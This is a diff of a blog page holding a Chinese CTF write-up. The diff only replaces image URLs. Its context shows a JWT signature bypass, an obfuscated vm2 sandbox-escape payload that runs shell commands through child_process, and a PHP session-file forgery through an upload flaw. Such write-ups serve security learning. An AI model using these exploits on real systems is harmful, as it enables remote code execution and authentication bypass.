@@ -110,7 +110,7 @@
 
 	<div class='post-body mb'>
 		<h1 id="easy-login"><a href="#easy-login" class="headerlink" title="easy_login"></a>easy_login</h1><p><code>/static/js/app.js</code>中有hint提示这个web使用<code>koa-static 来处理静态文件</code></p>
-<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20200420/15873489757041.png" alt="img"></p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20200420/15873489757041.png" alt="img"></p>
 <p>猜测存在koa路由配置错误导致根目录的任意文件读取。我们直接读取app.jpg</p>
 <pre><code class="http">http://dafd014be0114c23bd9aa2e1a84d01ea772d377a8e974ab5.changame.ichunqiu.com/app.js</code></pre>
 <pre><code class="javascript">const Koa = require(&#39;koa&#39;);
@@ -310,11 +310,11 @@ module.exports = {
 <ul>
 <li>头部构成主要由两部分，typ声明类型，alg声明加密类型，最后base64编码：</li>
 </ul>
-<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20200420/15873521703081.png" alt="img"></p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20200420/15873521703081.png" alt="img"></p>
 <ul>
 <li>payload</li>
 </ul>
-<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20200420/15873528037874.png" alt="img"></p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20200420/15873528037874.png" alt="img"></p>
 <ul>
 <li>签证由三部分组成<ul>
 <li>头（header）basee64</li>
@@ -324,7 +324,7 @@ module.exports = {
 </li>
 <li>签证拿到上述东西后通过header中加密方式加盐的方式加密形成了签证。</li>
 </ul>
-<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20200420/15873532192819.png" alt="img"></p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20200420/15873532192819.png" alt="img"></p>
 <p>了解JWT的组成后，我们总结JWT可能存在如下的安全问题：</p>
 <blockquote>
 <p>1.修改头什么的算法为none</p>
@@ -352,7 +352,7 @@ console.log(sid)
 <p>​        首先要绕过<code>sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0</code>j就不能让<code>global.secrets</code>这个数组为<code>undefined</code>，我们需要注册一个账号是的其初始化。</p>
 <p>​        其次为什么小于1大于零0呢，我们需要一个<code>global.secrets</code>的值为null,但是如果是0的话就是我们注册那个了，这样的话就会提示需要签名，如果是大于1小于零正好可以绕过第一层检测并且使得值为null。当然如果你注册的账号够多大于1也是可以的。还有就是可以使用空字符串进行绕过，空数组也行，因为nodejs中弱类型比较的关系这个会在下一个文章中重点研究。</p>
 <p>最终获得flag:</p>
-<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20200420/15873550195855.png" alt="img"></p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20200420/15873550195855.png" alt="img"></p>
 <h1 id="just-escape"><a href="#just-escape" class="headerlink" title="just_escape"></a>just_escape</h1><p>原题nodejs沙箱逃逸，但是对许多函数进行了过滤。</p>
 <p>和题中一个操作在issue中一样我们找最新的版本的<a href="https://github.com/patriksimek/vm2/issues/225。" target="_blank" rel="noopener">exp</a>来测试。</p>
 <pre><code>(function(){
@@ -372,7 +372,7 @@ console.log(sid)
         return e[`${`${`get_proces`}s`}`](()=&gt;{}).mainModule[`${`${`requir`}e`}`](`${`${`child_proces`}s`}`)[`${`${`exe`}cSync`}`](`whoami`).toString();
     }
 })()</code></pre>
-<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20200420/15873745251856.png" alt="img"></p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20200420/15873745251856.png" alt="img"></p>
 <h1 id="BabyUpload"><a href="#BabyUpload" class="headerlink" title="BabyUpload"></a>BabyUpload</h1><p>题目直接给了源码：</p>
 <pre><code class="php"> &lt;?php
 error_reporting(0);
@@ -522,7 +522,7 @@ if($direction === &quot;upload&quot;){
     exit;
 }</code></pre>
 <p>可以看到，这个session是php_binary类型</p>
-<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20200421/15874019524378.png" alt="img"></p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20200421/15874019524378.png" alt="img"></p>
 <table>
 <thead>
 <tr>
@@ -569,11 +569,11 @@ enctype=&quot;multipart/form-data&quot;&gt;
 &lt;/body&gt;
 &lt;/html&gt;</code></pre>
 <p>我们计算这个文件的sha256值是:432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4</p>
-<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20200421/15874022155480.png" alt="img"></p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20200421/15874022155480.png" alt="img"></p>
 <p>我们再读取文件看看，是否上传成功。上传成功后将arr参数改成success.txt再上传一次，因为file_exists($filename)检测的是文件或文件夹是否存在，这我们只要建一个文件夹即可。</p>
-<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20200421/15874023458299.png" alt="img"></p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20200421/15874023458299.png" alt="img"></p>
 <p>直接修改<code>PHPSESSID=432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4</code> 直接出来flag</p>
-<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20200421/15874024375148.png" alt="img"></p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20200421/15874024375148.png" alt="img"></p>
 
 	</div>
 	<div class="meta split">
